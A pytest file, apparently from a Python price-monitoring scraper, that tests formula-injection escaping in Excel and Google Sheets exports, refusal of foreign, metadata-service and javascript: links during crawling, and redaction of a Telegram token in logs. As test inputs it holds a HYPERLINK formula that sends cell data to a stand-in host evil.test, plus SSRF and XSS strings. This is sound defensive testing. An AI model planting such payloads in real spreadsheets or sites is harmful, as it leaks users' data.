"""Проверки безопасности: формулы из данных сайта, чужие ссылки в обходе, токен в журнале."""

import io
import logging
import sys
import types

from conftest import FakeSite, make_book, make_list
from openpyxl import load_workbook
from test_gsheet import FakeBook, NotFound

from pricewatch import __main__ as app
from pricewatch import export, store
from pricewatch.crawl import crawl
from pricewatch.parse import Product

ROOT = "https://shop.test/catalogue/"
EVIL = '=HYPERLINK("https://evil.test/?d="&A2,"жми")'


def _db(tmp_path):
    conn = store.connect(tmp_path / "db.sqlite")
    store.save_snapshot(conn, [Product("a", EVIL, 10.0, 3, 4, "@SUM(1)", "https://shop.test/a")], True)
    return conn


def test_excel_keeps_formula_like_title_as_text(tmp_path):
    conn = _db(tmp_path)
    path = export.to_excel(store.current(conn), store.recent_changes(conn), tmp_path / "p.xlsx")
    cell = load_workbook(path)["Товары"]["A2"]
    assert cell.value == EVIL and cell.data_type == "s"


def test_gsheet_escapes_formula_like_text(tmp_path, monkeypatch):
    book = FakeBook()
    fake = types.SimpleNamespace(
        service_account=lambda filename: types.SimpleNamespace(open_by_key=lambda key: book),
        WorksheetNotFound=NotFound,
    )
    monkeypatch.setitem(sys.modules, "gspread", fake)
    conn = _db(tmp_path)
    export.to_gsheet(store.current(conn), store.recent_changes(conn), "S", "/k.json")
    row = book.sheets["Товары"].data[1]
    assert row[0] == "'" + EVIL and row[1] == "'@SUM(1)"
    assert row[2] == 10.0  # числа не трогаем


def test_crawl_ignores_foreign_and_non_http_links():
    pages = {
        ROOT + "page-1.html": make_list(
            ["a/index.html", "http://169.254.169.254/latest/", "javascript:alert(1)"], None
        ),
        ROOT + "a/index.html": make_book("upc-a", "А", 10, 5),
    }
    fake = FakeSite(pages)
    res = crawl(fake, ROOT + "page-1.html")
    assert [p.upc for p in res.products] == ["upc-a"]
    assert fake.hits == [ROOT + "page-1.html", ROOT + "a/index.html"]
    # обход неполный — товары не помечаются «пропал с сайта»
    assert len(res.errors) == 2 and not res.complete


def test_crawl_stops_on_foreign_next_page():
    pages = {
        ROOT + "page-1.html": make_list(["a/index.html"], "https://evil.test/page-2.html"),
        ROOT + "a/index.html": make_book("upc-a", "А", 10, 5),
    }
    fake = FakeSite(pages)
    res = crawl(fake, ROOT + "page-1.html")
    assert "https://evil.test/page-2.html" not in fake.hits
    assert len(res.products) == 1 and not res.complete


def test_redact_hides_token_in_foreign_logs_and_tracebacks():
    buf = io.StringIO()
    handler = logging.StreamHandler(buf)
    handler.addFilter(app.Redact("123:SECRET"))
    log = logging.getLogger("urllib3.test-redact")
    log.addHandler(handler)
    log.propagate = False
    try:
        # так urllib3 пишет повтор запроса к Telegram
        log.warning("Retrying after connection broken by '%r': %s", "err", "/bot123:SECRET/sendMessage")
        try:
            raise OSError("https://api.telegram.org/bot123:SECRET/sendMessage")
        except OSError:
            log.exception("failed")
    finally:
        log.removeHandler(handler)
    out = buf.getvalue()
    assert "SECRET" not in out and out.count("***") == 3


def test_main_installs_redact_filter(monkeypatch, tmp_path):
    handler = logging.StreamHandler(io.StringIO())
    root = logging.getLogger()
    monkeypatch.setattr(root, "handlers", [handler])
    cfg = types.SimpleNamespace(tg_token="123:SECRET")
    monkeypatch.setattr(app.config, "load", lambda: cfg)
    monkeypatch.setattr(app, "run_once", lambda c: app.RunReport(0, 0, 0, True))
    app.main([])
    assert any(isinstance(f, app.Redact) and f.secret == "123:SECRET" for f in handler.filters)
